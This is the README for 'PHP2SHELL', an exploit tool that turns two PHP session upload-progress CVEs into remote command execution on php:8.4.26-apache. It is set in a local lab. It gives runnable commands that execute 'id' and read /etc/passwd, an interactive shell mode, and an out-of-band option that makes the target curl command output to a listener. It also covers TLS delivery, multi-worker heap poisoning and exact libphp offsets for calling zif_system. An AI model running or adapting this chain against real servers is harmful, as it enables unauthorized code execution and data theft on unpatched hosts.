# PHP2SHELL — official 8.4.26 target, HTTP/TLS, out-of-band output

Engine-level exploit and interactive tool for **CVE-2026-109618 / CVE-2026-109619**
on the environment used by 9bie's public ASLR research:

| Property | Value |
|---|---|
| Image | `php:8.4.26-apache` (`sha256:60111400ff77…`) |
| OS | Debian 13 trixie |
| PHP | 8.4.26 NTS, 64-bit, mod_php (`libphp.so`) |
| Apache | 2.4.69, prefork, one worker, `KeepAlive Off` |
| ini | stock `php.ini-production` (`display_errors=Off`, `memory_limit=128M`, `post_max_size=8M`) |
| Target page | `<?php echo "OK\n"; ?>` |
| Prerequisites | none beyond the stock image; no application code, no gdb, no target-side files |
| Multi-worker lab | same image/ini, prefork `MaxRequestWorkers 4`, `KeepAlive On`, `run_multi.sh` |

**Consolidated report:** [`../REPORT.md`](../REPORT.md) — stock 8.4.26
result, multi-worker/TLS/OOB, supporting ports, limitations.

Status: **working**. The reference chain was reproduced 7/7; the interactive
tool completed 11/11 commands after the parser fix, including a restart with
fresh ASLR. The `--multi` poisoning path additionally executed `id` on a
bounded four-worker lab (`/out/o64bd996b`); see `evidence/multi/`. Remote
delivery is validated both ways: `--oob` returns `id` over a callback, and
`--https` runs the full chain through a TLS bridge with the same callback
(`uid=33(www-data)` in `evidence/oob_id.txt`, `evidence/oob_tls_id.txt`).
Evidence for the official target is in `evidence/`; TLS/OOB evidence is in
`evidence/tls/`.

**Advisory boundary.** PHP fixed both CVEs in **8.2.35, 8.3.36, 8.4.27, and
8.5.12**. The CVE records give the affected branches as
`8.2.* < 8.2.35`, `8.3.* < 8.3.36`, `8.4.* < 8.4.27`, and
`8.5.* < 8.5.12`. `8.4.26` is the **last vulnerable 8.4 release**; `8.4.27`
is the **first fixed release** and is not a target. This lab proves the
8.4.26 point, not the full advisory range. Patched releases are negative
controls, not targets; they have not yet been run as full controls here.
Sources: [PHP advisory](https://www.php.net/archive/2026.php#2026-10-21-5),
[GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w),
[GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp),
[CVE-2026-109618](https://www.cve.org/CVERecord?id=CVE-2026-109618),
[CVE-2026-109619](https://www.cve.org/CVERecord?id=CVE-2026-109619).

## Quick start

From the repository root:

```bash
cd official-lab
./run.sh

# one command
python3 pure_shell.py --exec 'id'

# a few more
python3 pure_shell.py --exec 'uname -a'
python3 pure_shell.py --exec 'cat /etc/passwd | head -3'

# runtime address resolution only
python3 pure_shell.py --leak

# interactive
python3 pure_shell.py

# multi-worker lab (same stock image/ini, bounded 4-worker prefork pool)
./run_multi.sh
python3 pure_shell.py --port 18112 --multi --outdir multi-out --exec 'id'
python3 pure_shell.py --port 18112 --multi --leak

# out-of-band output: no /out read; target curls the listener
./experiments/run_oob_listener.sh          # prints the callback URL
python3 pure_shell.py --port 18110 \
  --oob 'http://<listener-ip>:18999/' --exec 'id'

# TLS: raw TCP-level terminator preserves the plain-HTTP chain
mkdir -p docker/tls
openssl req -x509 -newkey rsa:2048 -nodes -days 2 -subj /CN=localhost \
  -keyout docker/tls/key.pem -out docker/tls/cert.pem
python3 experiments/tls_tcp_forward.py \
  --cert docker/tls/cert.pem --key docker/tls/key.pem \
  --port 18444 --target-port 18110 &
python3 pure_shell.py --port 18444 --https --insecure \
  --oob 'http://<listener-ip>:18999/' --exec 'id'
```

`run.sh` starts the official target on `127.0.0.1:18110` and mounts `./out`
at `/out` inside the container. The tool writes each command's stdout/stderr
to `/out/oXXXXXXXX` and reads the same file from `./out/` on the host.
`run_multi.sh` starts the multi variant on `127.0.0.1:18112` with `./multi-out`
as `/out`; the default single-worker mode is still the correct mode for the
official target.

## Chain

The payloads speak plain HTTP; `--https` wraps that traffic in TLS through a
loopback bridge, so the chain itself is unchanged. No application-side PHP is
involved: the `session.upload_progress` callback runs during request startup,
before RINIT.

```
A1  END-cleanup send_cookie OOM
B1  stale-id OOB read  -> one Set-Cookie carries live heap pointers
A2  cheap-OOM          -> leaves PS(http_session_vars) dangling
B2  fake zend_reference + fake zend_array with pDestructor = zif_system
```

The tool derives both bases from the B1 cookie on every command:

```
libphp       = zval_ptr_dtor_pointer - 0x65eb60
zif_system   = libphp + 0x465370
main chunk   = majority heap bucket (2 MiB aligned; expected count 87)
fake array S = main + 0xf8398
```

No address is hardcoded; only the build-specific symbol offsets are. The full
geometry, payload parameters, and the parser pitfall are in `CALIBRATION.md`.

## Interactive commands

```
help                     this text
info                     target/settings and last leak
set <key> <value>        host|port|path|outdir|timeout|retries|zif|dtor|
                         main-bucket-count|restart|docker|oob|tls|
                         insecure|sni|multi|a1-workers|a1-waves|
                         b1-retries|a2-workers|a2-waves|b2-retries
oob <url> / set oob      curl callback URL for remote output (off clears)
set tls on|off           TLS to the target via the loopback bridge
set insecure on|off      skip TLS certificate verification
set sni <name>           TLS SNI / HTTP Host override
multi on|off             multi-worker poisoning mode
set a1-workers <n>       A1 poison concurrency (default 4)
set a1-waves <n>         A1 poison waves (default 1)
set b1-retries <n>       B1 leak retries (default 3)
set a2-workers <n>       A2 poison concurrency (default 8)
set a2-waves <n>         A2 poison waves (default 2)
set b2-retries <n>       B2 retries per main candidate (default 3)
leak                     run A1+B1 only; print runtime addresses
exec <command>           run command through the full chain; print output
raw <command>            send a raw system() command (no output wrapper)
shell                    interactive target shell (exec per line)
restart [name|auto]      restart the target container for fresh ASLR
quit / exit              leave
```

`--multi` targets a prefork pool. A1 is sprayed at the pool size, B1 is
retried, and A2 is sprayed in two waves so OOM-spawned replacement children
are poisoned too. A successful B2 usually closes without a response; the
proof file decides success. `--multi` is not for the single-worker official
target — use the default mode there.

`--restart auto` resolves the container by the published port. The launchers
use dedicated name variables (`OFFICIAL_NAME`, `MULTI_NAME`, `OOB_NAME`,
`TLS_NAME`) because this workspace exports a generic `NAME`; see the error
ledger. The official container is `DESKTOP-GQ7T0MS` in this workspace.

## Evidence

| File | What it shows |
|---|---|
| `evidence/target.txt` | image digest, container mounts, PHP/Apache/OS, stock ini, libphp hash, exact offsets |
| `evidence/pure_shell_id.log` | current-ASLR `id` |
| `evidence/pure_shell_uname.log` | `uname -a` |
| `evidence/pure_shell_passwd.log` | `cat /etc/passwd \| head -3` |
| `evidence/pure_shell_multi.log` | `id; uname -a; pwd` in one command |
| `evidence/pure_shell_ls.log` | `ls -la / \| head` |
| `evidence/pure_shell_repl.log` | REPL and nested `shell` mode |
| `evidence/pure_shell_leak.log` | leak-only address resolution |
| `evidence/pure_shell_fresh_aslr.log` | `--restart auto` then `id` with new addresses |
| `evidence/debug_first_try_parse_range_bug.log` | first run, parser range bug, no proof |
| `evidence/reference/` | 9bie reference exploit runs on the same image/config |
| `evidence/proofs/` | snapshots of the target-side output files |
| `evidence/proof_single_regression.txt` | default single-worker `id` after the `--multi` code changes |
| `evidence/proof_single_final.txt` | default single-worker `id; uname -a` after the TLS/OOB changes |
| `evidence/tool_single_final.log` | post-TLS/OOB `/out` regression (`o2e7b4073`, first try) |
| `evidence/oob_id.txt` | single-worker callback capture (`uid=33`, source `172.17.0.2`) |
| `evidence/tool_oob_id.log` | `--oob` full chain, no `/out` read |
| `evidence/multi/oob_multi_id.txt` | multi-worker callback capture (source `172.17.0.3`) |
| `evidence/multi/tool_multi_oob_id.log` | `--multi --oob` full chain |
| `evidence/tool_tls_leak.log` | A1+B1 through the nginx TLS proxy after the 4 MB header fix (`libphp=0x7fbbc7d3b000`) |
| `evidence/tool_tls_oob_id.log` | nginx full-chain failures (18443) and the TCP-terminator full chain + OOB (18444) |
| `evidence/oob_tls_id.txt` | TLS+OOB callback capture (`uid=33`) |
| `evidence/tls/` | nginx HTTP-proxy config/log (502 header-buffer negative), TCP terminator, listener, target identity |
| `evidence/multi/` | 4-worker target identity, PID log, leak, integrated `--multi` proof, negative controls, error ledger |
| `experiments/ERROR_LEDGER.md` | failure → root cause → fix ledger (chain, multi, TLS, OOB) |

The first ASLR generation leaked `libphp=0x7f7ef26c1000`; after a container
restart the same chain leaked `libphp=0x7f58687b4000` and executed `id`
again. Addresses are stable across prefork child respawns while the master
lives, which is why a full re-leak per command still succeeds.

## Limitations

- **Official target is single-worker; multi-worker is an extension.**
  `run.sh` deliberately uses one worker, matching the published 9bie target.
  `--multi` handles a bounded prefork pool (validated at four workers). The
  A1 wave must cover the whole pool; a larger or unbounded pool needs a
  larger `--a1-workers` and more retries. `--multi` on a single worker
  overwrites the same stale state and is not supported; use the default mode
  there.
- **TLS is a bridge, not a rewrite.** `--https` starts a loopback
  plain-TCP→TLS bridge for the unchanged HTTP payloads. A TCP-level TLS
  terminator (`experiments/tls_tcp_forward.py`) is the validated path: full
  chain plus OOB. An HTTP reverse proxy needs
  `proxy_buffer_size 4m` / `proxy_buffers 8 4m` because the B1 response is
  ~1.68 MB and its `Set-Cookie` header exceeds nginx's default 4–8 KB header
  buffer; with that the leak succeeds, but the full chain through the HTTP
  proxy is not stable in this lab (child lifecycle and the large response).
  Use mod_ssl or a TCP-level tunnel for the supported TLS path.
- **Output channel.** Default `exec` reads `/out` from the host bind mount.
  `--oob URL` wraps the command with `curl` to a listener and is the
  validated remote path (single-worker and multi). The target needs `curl`;
  the stock image has it. `--raw` still sends without a wrapper and has no
  output channel. The `--oob` wrapper is counted against the same 200-byte
  limit; the URL length reduces the command budget.
- **Command length.** `mk_ht.py` accepts 200 bytes including the output
  wrapper. The `/out` wrapper leaves about 154 bytes; the `--oob` wrapper
  leaves about 100 bytes depending on the callback URL.
- **Offsets are build-specific.** The defaults are for `php:8.4.26-apache`
  (`zif_system +0x465370`, `zval_ptr_dtor +0x65eb60`), the last vulnerable
  8.4 release. `8.4.27` is the advisory-confirmed first fixed release and is
  a boundary control, not a target. Other builds need their own offsets, and
  possibly different heap-shaping parameters.
- **One known bug, fixed.** The first run used
  `0x7fffffffffffffff` as the pointer upper bound and treated `0x41…`
  fillers as pointers. The correct 48-bit bound is `0x7fffffffffff`; see
  `CALIBRATION.md`.

## Files

```
official-lab/
  pure_shell.py          interactive tool (single-worker default, --multi option)
  multi_worker.py        multi-worker senders, waves, body builders
  run.sh                 official target (stock image + stock ini, port 18110)
  run_multi.sh           bounded 4-worker variant (port 18112)
  docker/apache.conf     one-worker prefork, KeepAlive Off
  docker/apache-multi.conf  4-worker prefork, KeepAlive On, PID log
  docker/nginx-tls.conf  TLS HTTP-proxy variant (needs 4m header buffers)
  docker/www/index.php   target page: OK
  docker/www/pid.php     prefork child PID diagnostic
  payloads/              A1/B1/A2/B2 generators and senders (from 9bie)
  out/                   target-side /out bind mount (official target)
  multi-out/             target-side /out bind mount (multi variant)
  oob-out/               callback listener captures
  evidence/              logs, target identity, proof snapshots, multi/TLS evidence
  experiments/           probes, TLS TCP terminator, OOB listener, ERROR_LEDGER.md
  CALIBRATION.md         offsets, geometry, wrapper, parser, TLS/OOB, recalibration
```
